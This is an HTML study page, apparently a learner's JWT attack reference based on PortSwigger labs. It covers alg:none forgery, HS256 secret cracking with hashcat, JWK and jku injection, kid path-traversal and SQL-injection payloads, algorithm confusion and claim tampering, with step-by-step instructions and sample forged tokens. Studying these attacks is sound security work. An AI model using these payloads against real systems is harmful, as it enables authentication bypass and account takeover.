@@ -1,0 +1,1084 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JWT Hacker — Complete Revision</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,600;1,400&family=Unbounded:wght@400;700;900&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<!-- Particle canvas background -->
+<canvas id="bg-canvas"></canvas>
+
+<!-- Sidebar nav -->
+<aside id="sidebar">
+  <div class="sidebar-logo">
+    <span class="logo-bracket">{</span>JWT<span class="logo-bracket">}</span>
+    <span class="logo-sub">HACKER</span>
+  </div>
+  <nav class="sidebar-nav">
+    <div class="nav-group">
+      <div class="nav-group-label">Foundation</div>
+      <a href="#basics" class="nav-link active" data-section="basics">
+        <span class="nav-icon">◈</span> What is JWT
+      </a>
+      <a href="#structure" class="nav-link" data-section="structure">
+        <span class="nav-icon">◈</span> Token Structure
+      </a>
+      <a href="#algorithms" class="nav-link" data-section="algorithms">
+        <span class="nav-icon">◈</span> Algorithms
+      </a>
+    </div>
+    <div class="nav-group">
+      <div class="nav-group-label">Attacks</div>
+      <a href="#none-alg" class="nav-link" data-section="none-alg">
+        <span class="nav-icon">◈</span> None Algorithm
+      </a>
+      <a href="#weak-secret" class="nav-link" data-section="weak-secret">
+        <span class="nav-icon">◈</span> Weak Secret
+      </a>
+      <a href="#jwk-inject" class="nav-link" data-section="jwk-inject">
+        <span class="nav-icon">◈</span> JWK Injection
+      </a>
+      <a href="#jku-inject" class="nav-link" data-section="jku-inject">
+        <span class="nav-icon">◈</span> JKU Injection
+      </a>
+      <a href="#kid-abuse" class="nav-link" data-section="kid-abuse">
+        <span class="nav-icon">◈</span> kid Abuse
+      </a>
+      <a href="#algo-confusion" class="nav-link" data-section="algo-confusion">
+        <span class="nav-icon">◈</span> Algo Confusion
+      </a>
+      <a href="#no-key" class="nav-link" data-section="no-key">
+        <span class="nav-icon">◈</span> No Exposed Key
+      </a>
+      <a href="#claim-abuse" class="nav-link" data-section="claim-abuse">
+        <span class="nav-icon">◈</span> Claim Manipulation
+      </a>
+      <a href="#exposure" class="nav-link" data-section="exposure">
+        <span class="nav-icon">◈</span> Exposure & Leakage
+      </a>
+      <a href="#advanced" class="nav-link" data-section="advanced">
+        <span class="nav-icon">◈</span> Advanced Vectors
+      </a>
+    </div>
+    <div class="nav-group">
+      <div class="nav-group-label">Labs & Practice</div>
+      <a href="#labs" class="nav-link" data-section="labs">
+        <span class="nav-icon">◈</span> PortSwigger Labs
+      </a>
+      <a href="#real-bounties" class="nav-link" data-section="real-bounties">
+        <span class="nav-icon">◈</span> Real Bug Bounties
+      </a>
+      <a href="#tools" class="nav-link" data-section="tools">
+        <span class="nav-icon">◈</span> Tools
+      </a>
+    </div>
+    <div class="nav-group">
+      <div class="nav-group-label">My Notes & Hunt</div>
+      <a href="#checklist" class="nav-link" data-section="checklist">
+        <span class="nav-icon">◈</span> Hunt Checklist
+      </a>
+      <a href="#notes" class="nav-link" data-section="notes">
+        <span class="nav-icon">◈</span> My Notes
+      </a>
+      <a href="#decoder" class="nav-link" data-section="decoder">
+        <span class="nav-icon">◈</span> JWT Decoder
+      </a>
+    </div>
+  </nav>
+  <div class="sidebar-footer">
+    <button id="theme-toggle" title="Toggle theme">◑</button>
+    <span class="sidebar-version">v2.0 — complete</span>
+  </div>
+</aside>
+
+<!-- Mobile top bar -->
+<div class="mobile-bar">
+  <button id="mob-menu-btn">☰</button>
+  <span class="mobile-title">{JWT} HACKER</span>
+  <button id="mob-search-btn">⌕</button>
+</div>
+
+<!-- Main content -->
+<main id="main">
+
+  <!-- Hero -->
+  <section id="basics" class="section hero-section">
+    <div class="hero-eyebrow">
+      <span class="pill pill-green">8/8 Labs Solved ✓</span>
+      <span class="pill pill-blue">PortSwigger Complete</span>
+      <span class="pill pill-orange">Bug Bounty Ready</span>
+    </div>
+    <h1 class="hero-title">JWT Security<br><span class="title-accent">Master Reference</span></h1>
+    <p class="hero-sub">Everything from token anatomy to expert-level attacks. Built from real lab experience, bug bounty reports, and CVE research. Your personal revision hub — edit notes, track progress, decode tokens.</p>
+
+    <div class="stats-row">
+      <div class="stat-box">
+        <div class="stat-num">11+</div>
+        <div class="stat-lbl">Attack Vectors</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-num">8/8</div>
+        <div class="stat-lbl">Labs Solved</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-num">$50K</div>
+        <div class="stat-lbl">Max Payout</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-num">∞</div>
+        <div class="stat-lbl">Editable Notes</div>
+      </div>
+    </div>
+
+    <div class="concept-card">
+      <div class="cc-label">// CORE CONCEPT</div>
+      <p class="cc-text">A JWT is a <strong>digital passport</strong> your browser carries after login. The server gives it to you; you show it on every request to prove who you are — without any database lookup. It has 3 base64-encoded parts separated by dots: <code>header.payload.signature</code></p>
+      <div class="cc-warning">⚠ JWTs are NOT encrypted by default — only <strong>signed</strong>. Anyone can decode and read them. The signature only proves they haven't been tampered with.</div>
+    </div>
+  </section>
+
+  <!-- TOKEN STRUCTURE -->
+  <section id="structure" class="section">
+    <div class="section-tag">02 — STRUCTURE</div>
+    <h2 class="section-title">JWT Token Anatomy</h2>
+
+    <div class="token-visual">
+      <div class="token-part tp-header" onclick="showPart('header')">
+        <span class="tp-label">HEADER</span>
+        <span class="tp-sample">eyJhbGciOiJSUzI1NiJ9</span>
+      </div>
+      <span class="tp-dot">.</span>
+      <div class="token-part tp-payload" onclick="showPart('payload')">
+        <span class="tp-label">PAYLOAD</span>
+        <span class="tp-sample">eyJzdWIiOiJ3aWVuZXIifQ</span>
+      </div>
+      <span class="tp-dot">.</span>
+      <div class="token-part tp-sig" onclick="showPart('sig')">
+        <span class="tp-label">SIGNATURE</span>
+        <span class="tp-sample">SflKxwRJSMe...</span>
+      </div>
+    </div>
+
+    <div class="part-detail" id="detail-header">
+      <div class="pd-title">Header — decoded</div>
+      <pre class="code-block"><span class="c-blue">{
+  "alg": "RS256",   </span><span class="c-comment">// algorithm — ATTACKER CAN CHANGE THIS</span><span class="c-blue">
+  "kid": "abc-123", </span><span class="c-comment">// key ID — ATTACKER CAN INJECT THIS</span><span class="c-blue">
+  "jku": "https://server.com/keys", </span><span class="c-comment">// key URL — ATTACKER CAN POINT TO OWN URL</span><span class="c-blue">
+  "jwk": { ... }    </span><span class="c-comment">// embedded key — ATTACKER CAN INJECT OWN KEY</span><span class="c-blue">
+}</span></pre>
+      <div class="pd-warning">Every header field is attacker-controlled. This is where most JWT attacks begin.</div>
+    </div>
+    <div class="part-detail" id="detail-payload" style="display:none">
+      <div class="pd-title">Payload — decoded</div>
+      <pre class="code-block"><span class="c-green">{
+  "sub": "wiener",      </span><span class="c-comment">// subject (user ID) — change to "administrator"</span><span class="c-green">
+  "role": "user",       </span><span class="c-comment">// role — change to "admin"</span><span class="c-green">
+  "iss": "portswigger", </span><span class="c-comment">// issuer</span><span class="c-green">
+  "exp": 1774367509,    </span><span class="c-comment">// expiry — often not validated!</span><span class="c-green">
+  "nbf": 1774281109,    </span><span class="c-comment">// not-before</span><span class="c-green">
+  "aud": "api.example"  </span><span class="c-comment">// audience — often not validated!</span><span class="c-green">
+}</span></pre>
+    </div>
+    <div class="part-detail" id="detail-sig" style="display:none">
+      <div class="pd-title">Signature — how it works</div>
+      <pre class="code-block"><span class="c-red">// RS256 signing:
+signature = RSA_encrypt(SHA256(header + "." + payload), PRIVATE_KEY)
+
+// Verification:
+decrypted = RSA_decrypt(signature, PUBLIC_KEY)
+expected  = SHA256(header + "." + payload)
+valid     = (decrypted === expected)  </span><span class="c-comment">// must match!</span></pre>
+      <div class="pd-warning">The WHOLE POINT of attacks: forge a valid signature without the private key.</div>
+    </div>
+
+    <div class="grid-2" style="margin-top:24px">
+      <div class="info-card">
+        <div class="ic-icon">🔓</div>
+        <h3>Decoding = trivial</h3>
+        <p>All parts are just base64url encoded. Decode at <code>jwt.io</code> in 1 second. Never put secrets in payload.</p>
+      </div>
+      <div class="info-card">
+        <div class="ic-icon">🎯</div>
+        <h3>Attack target</h3>
+        <p>Goal: modify payload claims (<code>sub</code>, <code>role</code>) AND produce a valid signature. All attacks achieve this differently.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ALGORITHMS -->
+  <section id="algorithms" class="section">
+    <div class="section-tag">03 — ALGORITHMS</div>
+    <h2 class="section-title">Signing Algorithms</h2>
+
+    <div class="algo-compare">
+      <div class="algo-card algo-symmetric">
+        <div class="algo-badge">HS256 — Symmetric</div>
+        <pre class="code-block" style="margin-top:12px"><span class="c-yellow">// ONE secret key for everything
+sign(data,   secret) → signature
+verify(sig,  secret) → valid/invalid
+
+// same key used both times!</span></pre>
+        <div class="algo-risk">
+          <span class="risk-label">RISK:</span> If secret is leaked or weak → anyone forges tokens
+        </div>
+      </div>
+      <div class="algo-vs">VS</div>
+      <div class="algo-card algo-asymmetric">
+        <div class="algo-badge">RS256 — Asymmetric</div>
+        <pre class="code-block" style="margin-top:12px"><span class="c-purple">// TWO mathematically linked keys
+sign(data,   PRIVATE_KEY) → signature  ← server keeps secret
+verify(sig,  PUBLIC_KEY)  → valid/invalid  ← world can see
+
+// can't forge with just public key... normally</span></pre>
+        <div class="algo-risk" style="background:rgba(0,212,170,0.08); border-color:rgba(0,212,170,0.2);">
+          <span class="risk-label" style="color:var(--green)">BUT:</span> Algorithm confusion attack can break this
+        </div>
+      </div>
+    </div>
+
+    <div class="explainer-box">
+      <div class="eb-title">🔏 Wax Seal Analogy</div>
+      <div class="grid-2" style="margin-top:12px">
+        <div>
+          <strong style="color:var(--text)">Private key</strong> = your unique stamp ring. Only you have it. Press into wax to create seal.
+        </div>
+        <div>
+          <strong style="color:var(--text)">Public key</strong> = photo of your stamp. Anyone can check "does this seal match?" But can't make a new seal without the real stamp.
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- NONE ALG -->
+  <section id="none-alg" class="section">
+    <div class="section-tag">ATTACK 01 — NONE ALGORITHM</div>
+    <h2 class="section-title">alg: none Bypass</h2>
+    <div class="difficulty-row">
+      <span class="badge badge-medium">Medium</span>
+      <span class="badge badge-critical">Critical Impact</span>
+      <span class="badge badge-tool">Burp + JWT Editor</span>
+    </div>
+
+    <div class="attack-concept">
+      <div class="ac-label">// CORE IDEA</div>
+      <p>If <code>alg</code> is set to <code>"none"</code>, the token is unsigned. Vulnerable servers that honor this accept ANY unsigned token with NO signature verification — allowing you to forge anything.</p>
+    </div>
+
+    <div class="steps-card">
+      <div class="steps-title">Attack Steps</div>
+      <div class="step"><span class="step-n">01</span><span>Log in → capture your JWT in Burp Repeater</span></div>
+      <div class="step"><span class="step-n">02</span><span>In JWT tab → change <code>alg</code> to <code>none</code> in header</span></div>
+      <div class="step"><span class="step-n">03</span><span>Change <code>sub</code> to <code>administrator</code> in payload</span></div>
+      <div class="step"><span class="step-n">04</span><span>Remove the signature part entirely (keep trailing dot: <code>header.payload.</code>)</span></div>
+      <div class="step"><span class="step-n">05</span><span>Send → if server accepts → full admin access ✅</span></div>
+    </div>
+
+    <pre class="code-block">
+<span class="c-comment">// Original (RS256):</span>
+eyJhbGciOiJSUzI1NiJ9.<span class="c-green">eyJzdWIiOiJ3aWVuZXIifQ</span>.SflKxwRJSMe...
+
+<span class="c-comment">// Forged (none):</span>
+eyJhbGciOiJub25lIn0.<span class="c-red">eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0</span>.
+                     <span class="c-comment">↑ "sub":"administrator"</span>    <span class="c-comment">↑ empty signature</span>
+    </pre>
+
+    <div class="warn-box">⚠ Try variants: <code>"none"</code>, <code>"None"</code>, <code>"NONE"</code>, <code>"nOnE"</code> — case-insensitive checks may pass different values</div>
+  </section>
+
+  <!-- WEAK SECRET -->
+  <section id="weak-secret" class="section">
+    <div class="section-tag">ATTACK 02 — WEAK HS256 SECRET</div>
+    <h2 class="section-title">Brute-Force HS256 Secret</h2>
+    <div class="difficulty-row">
+      <span class="badge badge-medium">Medium</span>
+      <span class="badge badge-high">High Impact</span>
+      <span class="badge badge-tool">Hashcat / jwt_tool</span>
+    </div>
+
+    <div class="attack-concept">
+      <div class="ac-label">// CORE IDEA</div>
+      <p>HS256 tokens are signed with a secret string. If that secret is weak (<code>admin123</code>, <code>secret</code>, <code>password</code>), hashcat can crack it in seconds. Once you have the secret, you can sign anything.</p>
+    </div>
+
+    <div class="steps-card">
+      <div class="steps-title">Attack Steps</div>
+      <div class="step"><span class="step-n">01</span><span>Confirm token uses <code>HS256</code> algorithm</span></div>
+      <div class="step"><span class="step-n">02</span><span>Save the full JWT to a file: <code>echo "eyJ..." > jwt.txt</code></span></div>
+      <div class="step"><span class="step-n">03</span><span>Run hashcat: <code>hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt</code></span></div>
+      <div class="step"><span class="step-n">04</span><span>If cracked → you see: <code>eyJ....:secret123</code></span></div>
+      <div class="step"><span class="step-n">05</span><span>Use cracked secret in JWT Editor to sign your forged token with any payload</span></div>
+    </div>
+
+    <pre class="code-block">
+<span class="c-comment"># hashcat command:</span>
+hashcat -a 0 -m 16500 jwt.txt rockyou.txt
+
+<span class="c-comment"># jwt_tool alternative:</span>
+python3 jwt_tool.py &lt;JWT&gt; -C -d wordlist.txt
+
+<span class="c-comment"># If cracked:</span>
+<span class="c-green">Token: eyJhbGci...
+Secret: secret123  ← now you can forge anything!</span>
+    </pre>
+
+    <div class="real-bounty-callout">
+      <span class="rbc-label">💰 REAL BOUNTY</span>
+      A researcher found an API using HS256 with secret <code>"admin123"</code> — cracked in seconds — forged admin token — full takeover — <strong>$5,000 payout</strong>
+    </div>
+  </section>
+
+  <!-- JWK INJECTION -->
+  <section id="jwk-inject" class="section">
+    <div class="section-tag">ATTACK 03 — JWK HEADER INJECTION</div>
+    <h2 class="section-title">Embedded JWK Injection</h2>
+    <div class="difficulty-row">
+      <span class="badge badge-high">Hard</span>
+      <span class="badge badge-critical">Critical Impact</span>
+      <span class="badge badge-tool">Burp + JWT Editor</span>
+    </div>
+
+    <div class="attack-concept">
+      <div class="ac-label">// CORE IDEA</div>
+      <p>The JWT header can include a <code>jwk</code> field with a full public key embedded. Misconfigured servers that trust this embedded key will verify the token against the attacker's own key — and since you generated the key pair, you can sign anything.</p>
+    </div>
+
+    <div class="flow-diagram">
+      <div class="fd-step">Generate RSA key pair in Burp</div>
+      <div class="fd-arrow">→</div>
+      <div class="fd-step">Embed public key in JWT header as <code>jwk</code></div>
+      <div class="fd-arrow">→</div>
+      <div class="fd-step">Sign with YOUR private key</div>
+      <div class="fd-arrow">→</div>
+      <div class="fd-step">Server uses embedded key to verify → ✅</div>
+    </div>
+
+    <div class="steps-card">
+      <div class="steps-title">Attack Steps (Burp)</div>
+      <div class="step"><span class="step-n">01</span><span>JWT Editor Keys → New RSA Key → Generate → OK</span></div>
+      <div class="step"><span class="step-n">02</span><span>In Repeater JWT tab → Attack → Embedded JWK</span></div>
+      <div class="step"><span class="step-n">03</span><span>Select your RSA key → OK (Burp auto-injects jwk into header)</span></div>
+      <div class="step"><span class="step-n">04</span><span>Change <code>sub</code> → <code>administrator</code> in payload</span></div>
+      <div class="step"><span class="step-n">05</span><span>Sign → Don't modify header → Send ✅</span></div>
+    </div>
+
+    <pre class="code-block">
+<span class="c-comment">// Forged header contains YOUR public key:</span>
+{
+  "alg": "RS256",
+  "jwk": {
+    "kty": "RSA",
+    "e": "AQAB",
+    "kid": "your-kid",
+    "n": "your-public-n..."   <span class="c-comment">← YOUR public key here</span>
+  }
+}
+<span class="c-comment">// Signed with YOUR private key → server trusts jwk field → valid ✅</span>
+    </pre>
+
+    <div class="cve-badge">CVE-2018-0114 — node-jose library accepted attacker jwk injection</div>
+  </section>
+
+  <!-- JKU INJECTION -->
+  <section id="jku-inject" class="section">
+    <div class="section-tag">ATTACK 04 — JKU HEADER INJECTION ★ YOU SOLVED THIS</div>
+    <h2 class="section-title">JKU URL Injection</h2>
+    <div class="difficulty-row">
+      <span class="badge badge-high">Hard</span>
+      <span class="badge badge-critical">Critical Impact</span>
+      <span class="badge badge-tool">Burp + Exploit Server</span>
+      <span class="badge badge-solved">✓ Solved</span>
+    </div>
+
+    <div class="attack-concept">
+      <div class="ac-label">// CORE IDEA</div>
+      <p>The <code>jku</code> header tells the server where to <strong>fetch</strong> the public key from (a URL). A vulnerable server doesn't check if that URL is trusted — so you point it to YOUR exploit server hosting YOUR public key. Server fetches your key, verifies your signature, done.</p>
+    </div>
+
+    <div class="visual-attack">
+      <div class="va-attacker">
+        <div class="va-box">🧑‍💻 You</div>
+        <div class="va-actions">
+          <div class="va-action">1. Generate RSA key pair</div>
+          <div class="va-action">2. Host public key on exploit server</div>
+          <div class="va-action">3. Forge JWT: jku → exploit server URL</div>
+          <div class="va-action">4. Sign with YOUR private key</div>
+        </div>
+      </div>
+      <div class="va-flow">
+        <div class="va-arrow-big">→ sends JWT →</div>
+        <div class="va-arrow-big">← fetches key ←</div>
+      </div>
+      <div class="va-server">
+        <div class="va-box">🖥 Target Server</div>
+        <div class="va-actions">
+          <div class="va-action">5. Reads jku from token</div>
+          <div class="va-action">6. Fetches key from your URL</div>
+          <div class="va-action">7. Verifies signature → matches ✅</div>
+          <div class="va-action success-action">8. Grants admin access 💀</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="steps-card">
+      <div class="steps-title">Complete Attack Steps</div>
+      <div class="step"><span class="step-n">01</span><span>JWT Editor Keys → New RSA Key → Generate → OK (note the kid)</span></div>
+      <div class="step"><span class="step-n">02</span><span>Right-click key → <strong>Copy Public Key as JWK</strong></span></div>
+      <div class="step"><span class="step-n">03</span><span>Go to exploit server in browser → Body section → paste:</span></div>
+    </div>
+
+    <pre class="code-block">
+{ "keys": [ { "kty":"RSA", "e":"AQAB", "kid":"YOUR-KID", "n":"YOUR-N" } ] }
+    </pre>
+
+    <div class="steps-card">
+      <div class="step"><span class="step-n">04</span><span>Click <strong>Store</strong> on exploit server</span></div>
+      <div class="step"><span class="step-n">05</span><span>In Repeater JWT header → add/change:</span></div>
+    </div>
+
+    <pre class="code-block">
+{ "kid": "YOUR-KID", "alg": "RS256", "jku": "https://YOUR-EXPLOIT-SERVER/exploit" }
+    </pre>
+
+    <div class="steps-card">
+      <div class="step"><span class="step-n">06</span><span>Payload → change <code>sub</code> to <code>administrator</code></span></div>
+      <div class="step"><span class="step-n">07</span><span>Sign → select RSA key → <strong>Don't modify header</strong> → OK</span></div>
+      <div class="step"><span class="step-n">08</span><span>Send to <code>/admin</code> → find delete URL → delete carlos ✅</span></div>
+    </div>
+
+    <div class="warn-box">⚠ COMMON MISTAKE: Burp Collaborator ≠ Exploit Server! The exploit server is a button ON THE LAB PAGE in browser — not inside Burp.</div>
+  </section>
+
+  <!-- KID ABUSE -->
+  <section id="kid-abuse" class="section">
+    <div class="section-tag">ATTACK 05 — KID PARAMETER ABUSE</div>
+    <h2 class="section-title">kid Header Injection</h2>
+    <div class="difficulty-row">
+      <span class="badge badge-high">Hard</span>
+      <span class="badge badge-critical">Critical Impact</span>
+      <span class="badge badge-tool">Burp + JWT Editor</span>
+    </div>
+
+    <div class="attack-concept">
+      <div class="ac-label">// CORE IDEA</div>
+      <p>The <code>kid</code> (key ID) header tells the server which key to use. If the server uses <code>kid</code> as a file path or database query without sanitization — you can inject to load arbitrary files or perform SQLi.</p>
+    </div>
+
+    <div class="grid-2">
+      <div class="attack-variant">
+        <div class="av-title">Path Traversal via kid</div>
+        <pre class="code-block" style="font-size:12px">
+<span class="c-comment">// kid injected as file path:</span>
+{ "kid": "../../dev/null" }
+
+<span class="c-comment">// Server reads /dev/null (empty string)
+// Sign your token with empty string as HMAC secret:
+// HMAC(data, "") → server verifies same way → valid ✅</span>
+        </pre>
+        <div class="av-step">Sign token with empty string <code>""</code> as HS256 secret</div>
+      </div>
+      <div class="attack-variant">
+        <div class="av-title">SQL Injection via kid</div>
+        <pre class="code-block" style="font-size:12px">
+<span class="c-comment">// kid injected into SQL query:
+// SELECT key FROM keys WHERE kid = '{kid}'</span>
+
+{ "kid": "x' UNION SELECT 'hacked'--" }
+
+<span class="c-comment">// Returns "hacked" as the key
+// Sign token with "hacked" as HS256 secret → valid ✅</span>
+        </pre>
+        <div class="av-step">Sign token with your injected string as HS256 secret</div>
+      </div>
+    </div>
+
+    <div class="steps-card" style="margin-top:16px">
+      <div class="steps-title">Path Traversal Attack Steps</div>
+      <div class="step"><span class="step-n">01</span><span>In JWT header → change <code>kid</code> to <code>../../../dev/null</code></span></div>
+      <div class="step"><span class="step-n">02</span><span>Change <code>alg</code> to <code>HS256</code></span></div>
+      <div class="step"><span class="step-n">03</span><span>JWT Editor Keys → New Symmetric Key → set <code>k</code> value to Base64 of empty string: <code>AA==</code></span></div>
+      <div class="step"><span class="step-n">04</span><span>Change payload <code>sub</code> → <code>administrator</code></span></div>
+      <div class="step"><span class="step-n">05</span><span>Sign with the empty symmetric key → Send ✅</span></div>
+    </div>
+  </section>
+
+  <!-- ALGO CONFUSION -->
+  <section id="algo-confusion" class="section">
+    <div class="section-tag">ATTACK 06 — ALGORITHM CONFUSION ★ YOU SOLVED THIS</div>
+    <h2 class="section-title">RS256 → HS256 Confusion</h2>
+    <div class="difficulty-row">
+      <span class="badge badge-high">Hard</span>
+      <span class="badge badge-critical">Critical Impact</span>
+      <span class="badge badge-tool">Burp + /jwks.json</span>
+      <span class="badge badge-solved">✓ Solved</span>
+    </div>
+
+    <div class="attack-concept">
+      <div class="ac-label">// CORE IDEA — THE TRICK</div>
+      <p>You change <code>alg</code> from <code>RS256</code> to <code>HS256</code>. The server's buggy code now uses the <strong>RSA public key as the HMAC secret</strong>. Since the public key is public (at <code>/jwks.json</code>), you already have it. You sign with it. Server verifies with it. Match. Done.</p>
+    </div>
+
+    <div class="comparison-table-wrap">
+      <table class="ctable">
+        <thead><tr><th></th><th>Normal RS256</th><th>Attack HS256</th></tr></thead>
+        <tbody>
+          <tr><td>Sign with</td><td class="c-red">Private key (secret)</td><td class="c-green">Public key (you have it!)</td></tr>
+          <tr><td>Verify with</td><td class="c-blue">Public key</td><td class="c-blue">Public key (same!)</td></tr>
+          <tr><td>Can you forge?</td><td class="c-red">❌ No private key</td><td class="c-green">✅ Public key is free</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="steps-card">
+      <div class="steps-title">Complete Attack Steps</div>
+      <div class="step"><span class="step-n">01</span><span>Visit <code>/jwks.json</code> or <code>/.well-known/jwks.json</code> → copy server's public key (JWK)</span></div>
+      <div class="step"><span class="step-n">02</span><span>JWT Editor Keys → New RSA Key → paste JWK → OK</span></div>
+      <div class="step"><span class="step-n">03</span><span>Double-click key → select <strong>PEM</strong> radio button → copy PEM</span></div>
+      <div class="step"><span class="step-n">04</span><span>Decoder tab → paste PEM → Encode as <strong>Base64</strong> → copy output</span></div>
+      <div class="step"><span class="step-n">05</span><span>JWT Editor Keys → New Symmetric Key → Generate → replace <code>k</code> value with your Base64 PEM → OK</span></div>
+      <div class="step"><span class="step-n">06</span><span>In Repeater JWT tab → change <code>alg</code> → <code>HS256</code> in header</span></div>
+      <div class="step"><span class="step-n">07</span><span>Change <code>sub</code> → <code>administrator</code> in payload</span></div>
+      <div class="step"><span class="step-n">08</span><span>Sign with Symmetric Key → <strong>Don't modify header</strong> → OK → Send ✅</span></div>
+    </div>
+
+    <div class="cve-badge">CVE-2024-54150, CVE-2024-37568 — Real-world algorithm confusion CVEs</div>
+  </section>
+
+  <!-- NO EXPOSED KEY -->
+  <section id="no-key" class="section">
+    <div class="section-tag">ATTACK 07 — NO EXPOSED KEY ★ YOU SOLVED THIS</div>
+    <h2 class="section-title">Algorithm Confusion (Hidden Public Key)</h2>
+    <div class="difficulty-row">
+      <span class="badge badge-expert">Expert</span>
+      <span class="badge badge-critical">Critical Impact</span>
+      <span class="badge badge-tool">Docker + Burp</span>
+      <span class="badge badge-solved">✓ Solved</span>
+    </div>
+
+    <div class="attack-concept">
+      <div class="ac-label">// CORE IDEA</div>
+      <p>Same as algorithm confusion but <code>/jwks.json</code> doesn't exist. You <strong>mathematically derive</strong> the public key from 2 JWT tokens signed with the same private key using the <code>sig2n</code> Docker tool.</p>
+    </div>
+
+    <div class="explainer-box" style="margin-bottom:16px">
+      <div class="eb-title">Why 2 tokens?</div>
+      <p>RSA signatures mathematically leak information about the key. With <strong>1 token</strong> — not enough math. With <strong>2 tokens</strong> from the same key — the tool can reverse-engineer the <code>n</code> value (part of the public key). Like studying 2 wax seals so carefully you reconstruct the original stamp.</p>
+    </div>
+
+    <div class="steps-card">
+      <div class="steps-title">Complete Attack Steps</div>
+      <div class="step"><span class="step-n">01</span><span>Log in as <code>wiener:peter</code> → copy JWT → save as Token 1</span></div>
+      <div class="step"><span class="step-n">02</span><span>Log out → log back in → copy new JWT → save as Token 2</span></div>
+      <div class="step"><span class="step-n">03</span><span>Run Docker tool:</span></div>
+    </div>
+
+    <pre class="code-block">
+docker run --rm -it portswigger/sig2n &lt;TOKEN1&gt; &lt;TOKEN2&gt;
+    </pre>
+
+    <div class="steps-card">
+      <div class="step"><span class="step-n">04</span><span>Tool outputs 2 candidate keys + 2 tampered JWTs</span></div>
+      <div class="step"><span class="step-n">05</span><span>Test each tampered JWT in Burp Repeater on <code>/my-account</code></span></div>
+      <div class="step"><span class="step-n">06</span><span><strong>Direct 200</strong> = correct key ✅ | <strong>302 redirect</strong> = wrong key ❌</span></div>
+      <div class="step"><span class="step-n">07</span><span>Take the Base64 x509 key from the correct candidate</span></div>
+      <div class="step"><span class="step-n">08</span><span>JWT Editor → New Symmetric Key → replace <code>k</code> with that Base64 key</span></div>
+      <div class="step"><span class="step-n">09</span><span>Change <code>alg</code> → <code>HS256</code>, <code>sub</code> → <code>administrator</code> → sign → send ✅</span></div>
+    </div>
+
+    <pre class="code-block">
+<span class="c-comment"># Tool output looks like:</span>
+Found n with multiplier 1:
+  Base64 encoded x509 key: <span class="c-green">LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0K...</span>
+  Tampered JWT: <span class="c-yellow">eyJraWQiOiJ... ← test this one in Repeater</span>
+
+  Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0t...
+  Tampered JWT: eyJraWQiOiJ... ← and this one
+    </pre>
+  </section>
+
+  <!-- CLAIM MANIPULATION -->
+  <section id="claim-abuse" class="section">
+    <div class="section-tag">ATTACK 08 — CLAIM MANIPULATION</div>
+    <h2 class="section-title">Payload Claim Abuse</h2>
+
+    <div class="grid-2">
+      <div class="attack-variant">
+        <div class="av-title">Role Escalation</div>
+        <pre class="code-block" style="font-size:12px">
+<span class="c-comment">// Before:</span>
+{ "sub": "wiener", <span class="c-red">"role": "user"</span> }
+
+<span class="c-comment">// After (if server doesn't re-validate):</span>
+{ "sub": "wiener", <span class="c-green">"role": "admin"</span> }
+        </pre>
+      </div>
+      <div class="attack-variant">
+        <div class="av-title">Expiry Bypass</div>
+        <pre class="code-block" style="font-size:12px">
+<span class="c-comment">// Many servers don't validate exp:</span>
+{ "sub": "wiener", <span class="c-red">"exp": 1000000000</span> }
+                   <span class="c-comment">↑ year 2001 — try sending old tokens</span>
+
+<span class="c-comment">// Or remove exp entirely:</span>
+{ "sub": "administrator" }
+        </pre>
+      </div>
+      <div class="attack-variant">
+        <div class="av-title">Audience/Issuer Bypass</div>
+        <pre class="code-block" style="font-size:12px">
+<span class="c-comment">// Token for service-a used on service-b:</span>
+{ "iss": "service-a", "aud": "service-b" }
+
+<span class="c-comment">// Or blank/missing aud accepted:</span>
+{ "sub": "admin" }  <span class="c-comment">← no aud claim</span>
+        </pre>
+      </div>
+      <div class="attack-variant">
+        <div class="av-title">Access/Refresh Confusion</div>
+        <pre class="code-block" style="font-size:12px">
+<span class="c-comment">// App uses two token types but doesn't
+// distinguish them at every endpoint:</span>
+{ "type": "refresh", "sub": "admin" }
+<span class="c-comment">→ try using refresh token as access token</span>
+        </pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- EXPOSURE -->
+  <section id="exposure" class="section">
+    <div class="section-tag">ATTACK 09 — EXPOSURE & LEAKAGE</div>
+    <h2 class="section-title">Token Exposure Vulnerabilities</h2>
+
+    <div class="grid-2">
+      <div class="info-card ic-red">
+        <div class="ic-icon">🔗</div>
+        <h3>Token in URL</h3>
+        <p>JWT in query string (<code>?token=eyJ...</code>) ends up in browser history, server logs, Referer headers. Attacker can steal from logs.</p>
+        <div class="ic-example">Real case: confirmation links contained JWT with user email + plaintext password in payload → $$$</div>
+      </div>
+      <div class="info-card ic-red">
+        <div class="ic-icon">♻</div>
+        <h3>No Expiry / No Revocation</h3>
+        <p>Token valid forever after logout. Steal once → use indefinitely. Check: does old token work after logout?</p>
+        <div class="ic-example">Test: log out → send old token → still 200? → valid bug</div>
+      </div>
+      <div class="info-card ic-red">
+        <div class="ic-icon">🔓</div>
+        <h3>Sensitive Data in Payload</h3>
+        <p>Passwords, API keys, internal IDs in base64 payload = information disclosure. Always decode and read payload.</p>
+        <div class="ic-example">Never trust that base64 = encrypted. It doesn't.</div>
+      </div>
+      <div class="info-card ic-red">
+        <div class="ic-icon">🎭</div>
+        <h3>Token Replay / Hijacking</h3>
+        <p>Captured JWT can be replayed until expiry. No binding to IP, user-agent, or session. Steal → impersonate.</p>
+        <div class="ic-example">Test on public WiFi scenario. Check for token binding mechanisms.</div>
+      </div>
+    </div>
+  </section>
+
